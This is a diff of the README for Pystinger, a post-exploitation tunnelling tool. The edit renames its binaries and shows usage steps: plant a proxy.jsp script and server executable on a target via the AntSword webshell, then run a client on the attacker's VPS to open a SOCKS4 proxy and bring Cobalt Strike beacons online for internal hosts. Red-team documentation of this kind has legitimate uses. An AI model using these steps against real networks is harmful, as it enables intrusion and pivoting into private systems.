@@ -10,18 +10,18 @@ Pystinger is developed in python, and currently supports three proxy scripts: ph
 
 
 # Usage
-> Suppose the domain name of the server is[ http://example.com :8080](http://192.168.3.11:8080) The intranet IPAddress of the server intranet is 192.168.3.11
+> Suppose the domain name of the server is [http://example.com:8080](http://192.168.3.11:8080) The intranet IPAddress of the server intranet is 192.168.3.11
 
 ## SOCK4 Proxy
 
 
 * ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
-* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe```to start pystinger-server
-> Don't run ```D:/xxx/singer_server.exe``` directly,it will cause TCP disconnection
-* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
+* ```server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/server.exe```to start pystinger-server
+> Don't run ```D:/xxx/server.exe``` directly,it will cause TCP disconnection
+* Run ```./client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
 * Your will see following output
 ```
-root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
+root@kali:~# ./client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
 2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
 2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
@@ -52,12 +52,12 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 ## cobaltstrike`s beacon online for single target
 
 * ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
-* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe```to start pystinger-server
-> Don't run ```D:/xxx/singer_server.exe``` directly,it will cause TCP disconnection
-* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
+* ```server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/server.exe```to start pystinger-server
+> Don't run ```D:/xxx/server.exe``` directly,it will cause TCP disconnection
+* Run ```./client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
 * Your will see following output
 ```
-root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
+root@kali:~# ./client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
 2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
 2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
@@ -88,12 +88,12 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 ## cobaltstrike`s beacon online for multi targets
 
 * ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
-* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe  192.168.3.11```to start pystinger-server (192.168.3.11 is intranet ipaddress of the target)
+* ```server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/server.exe  192.168.3.11```to start pystinger-server (192.168.3.11 is intranet ipaddress of the target)
 > 192.168.3.11 can change to 0.0.0.0
-* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
+* Run ```./client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
 * Your will see following output
 ```
-root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
+root@kali:~# ./client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
 2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
 2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
@@ -137,7 +137,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 [https://github.com/SECFORCE/Tunna](https://github.com/SECFORCE/Tunna)
 
 # Tested
-## stinger_server\stinger_client
+## server\client
 * windows 
 * linux
 ## proxy.jsp(x)/php/aspx
